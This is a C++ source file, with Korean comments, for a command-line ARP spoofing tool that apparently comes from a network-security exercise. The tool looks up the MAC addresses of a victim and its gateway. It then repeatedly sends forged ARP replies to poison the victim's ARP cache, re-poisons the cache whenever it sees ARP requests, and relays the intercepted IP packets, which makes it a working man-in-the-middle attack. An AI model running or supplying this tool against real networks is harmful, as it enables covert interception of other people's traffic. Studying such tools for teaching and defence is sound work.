#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iso646.h>
#include <vector>
#include <map>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;
vector<pair<Ip, Ip>> spoof_ip;
map<Ip, Mac> Arp_table;
bool loop = true;

struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};

Ip get_my_IP(const char *ifr)
{
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in *sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        fprintf(stderr, "Fail to get interface IP address - socket() failed\n");
        exit(-1);
    }
    strcpy(ifrq.ifr_name, ifr);

    //get_ip
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0)
    {
        perror("ioctl() SIOCGIFADDR error");
        exit(-1);
    }
    uint8_t ip_arr[Ip::SIZE];
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy(ip_arr, (void *)&sin->sin_addr, sizeof(sin->sin_addr));
    uint32_t ip = (ip_arr[0] << 24) | (ip_arr[1] << 16) | (ip_arr[2] << 8) | (ip_arr[3]);

    return Ip(ip);
}
Mac get_my_MAC(const char *ifr)
{
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in *sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        fprintf(stderr, "Fail to get interface IP address - socket() failed\n");
        exit(-1);
    }
    strcpy(ifrq.ifr_name, ifr);

    //get_mac
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifrq) < 0)
    {
        perror("ioctl() SIOCGIFHWADDR error");
        exit(-1);
    }
    Mac mac_tmp;
    memcpy(&mac_tmp, ifrq.ifr_hwaddr.sa_data, Mac::SIZE);
    return mac_tmp;
}
int send_ARP_packet(pcap_t *handle, EthArpPacket packet)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return res;
}
int send_IP_packet(pcap_t *handle, const u_char *packet, int size)
{
    //ip의 경우 뒤에 msg가 있으므로 size가 고정되지 않음. u_char*로 전달해야 함
    int res = pcap_sendpacket(handle, packet, size);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return res;
}
EthArpPacket make_ARP_REQUEST(Mac smac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet.eth_.smac_ = smac;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = smac;
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}
EthArpPacket make_ARP_REPLY(Mac smac, Mac dmac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet.eth_.smac_ = smac;
    packet.eth_.dmac_ = dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.tmac_ = dmac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}
Mac get_MAC_by_ARP(pcap_t *handle, const EthArpPacket sendpk)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (1)
    {
        //request 송신
        send_ARP_packet(handle, sendpk);

        //reply 수신
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        //get_mac
        EthArpPacket *ARPpacket = (EthArpPacket *)packet;
        if (ntohs(ARPpacket->eth_.type_) not_eq EthHdr::Arp)
            continue;
        if (ntohs(ARPpacket->arp_.op_) not_eq ArpHdr::Reply)
            continue;
        if (ntohl(ARPpacket->arp_.sip_) not_eq ntohl(sendpk.arp_.tip_))
            continue;
        if (ntohl(ARPpacket->arp_.tip_) not_eq ntohl(sendpk.arp_.sip_))
            continue;
        Mac mac_tmp;
        memcpy(&mac_tmp, &ARPpacket->arp_.smac_, Mac::SIZE);
        return mac_tmp;
    }
    exit(-1);
}

void infect(pcap_t *handle, Ip my_ip, Mac my_mac)
{
    //예상치 못한 이유로 끊길 수 있으므로 주기적으로 infect
    //몇초마다 재감염할까요? 일단 10초
    while (loop)
    {
        for (auto iter : spoof_ip)
        {
            EthArpPacket spoof_packet = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
            send_ARP_packet(handle, spoof_packet);
        }
        sleep(10);
    }
}
void receive(pcap_t *handle, Ip my_ip, Mac my_mac)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (loop)
    {
        //reply 수신
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket *ARPpacket = (EthArpPacket *)packet;
        //arp_request이면 재감염
        if (ntohs(ARPpacket->eth_.type_) == EthHdr::Arp)
        {
            if (ntohs(ARPpacket->arp_.op_) not_eq ArpHdr::Request)
                continue;
            for (auto iter : spoof_ip)
            {
                if (ntohl(ARPpacket->arp_.sip_) not_eq iter.first)
                    continue;
                if (ntohl(ARPpacket->arp_.tip_) not_eq iter.second)
                    continue;
                EthArpPacket spoof_packet = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
                sleep(1); //너무 빨리 보내면 arp table이 정상 reply에 overwrite됨
                send_ARP_packet(handle, spoof_packet);
                break;
            }
        }
        //ip이면 relay
        //EthArpPacket*로 접근해도 어차피 arp 부분은 건드리지 않아서 괜찮
        if (ntohs(ARPpacket->eth_.type_) == EthHdr::Ip4)
        {
            for (auto iter : spoof_ip)
            {
                if (ARPpacket->eth_.smac_ not_eq Arp_table[iter.first])
                    continue;
                if (ARPpacket->eth_.dmac_ not_eq my_mac)
                    continue;
                ARPpacket->eth_.smac_ = my_mac; //my_mac을 보내야 CAM table이 깨지지 않음
                ARPpacket->eth_.dmac_ = Arp_table[iter.second];
                send_IP_packet(handle, packet, header->caplen);
                break;
            }
        }
    }
}

int main(int argc, char *argv[])
{
    //매개변수 확인(4개보다 작거나 불완전 입력인지)
    if ((argc < 4) or (argc % 2))
    {
        printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
        return -1;
    }

    //pcap_open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(argv[1], PCAP_ERRBUF_SIZE, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    //attacker(me)의 ip, mac 주소 알아내기
    //함수 반환형을 각각 Ip, Mac으로 수정
    Ip my_ip = get_my_IP(argv[1]);
    Mac my_mac = get_my_MAC(argv[1]);
    // printf("attacker_ip: %s\n", string(my_ip).c_str());
    // printf("attacker_mac: %s\n", string(my_mac).c_str());

    //sender(victim, you)와 target(gateway)의 mac 주소 알아내기
    //<sip, tip>로 각각의 spoof_table을 만들고 map<Ip, Mac>으로 Mac 주소 저장(Arp_table 구현)
    for (int i = 1; i < argc / 2; i++)
    {
        spoof_ip.push_back({Ip(argv[2 * i]), Ip(argv[2 * i + 1])});
        if (not Arp_table.count(Ip(argv[2 * i])))
        {
            EthArpPacket sender_packet = make_ARP_REQUEST(my_mac, my_ip, Ip(argv[2 * i]));
            Arp_table[Ip(argv[2 * i])] = get_MAC_by_ARP(handle, sender_packet);
        }
        if (not Arp_table.count(Ip(argv[2 * i + 1])))
        {
            EthArpPacket target_packet = make_ARP_REQUEST(my_mac, my_ip, Ip(argv[2 * i + 1]));
            Arp_table[Ip(argv[2 * i + 1])] = get_MAC_by_ARP(handle, target_packet);
        }
    }
    // for (const auto &[key, value] : Arp_table)
    //     printf("%s : %s\n", string(key).c_str(), string(value).c_str());

    //감염과 릴레이를 동시에 수행해야 한다 -> 스레드 활용
    //스레드 사용법은 https://modoocode.com/269을 참고
    //1. 감염시키는 스레드
    //2. 릴레이하는 스레드
    thread t1(infect, handle, my_ip, my_mac);
    thread t2(receive, handle, my_ip, my_mac);

    //q 입력하면 스레드 종료
    printf("'q'를 입력하면 프로그램이 종료됩니다.\n");
    printf("종료까지 최대 10초가 걸리므로 기다려주시기 바랍니다.\n");
    char input;
    while (getchar() not_eq 'q')
        ;
    loop = false;
    t1.join();
    t2.join();

    pcap_close(handle);
}
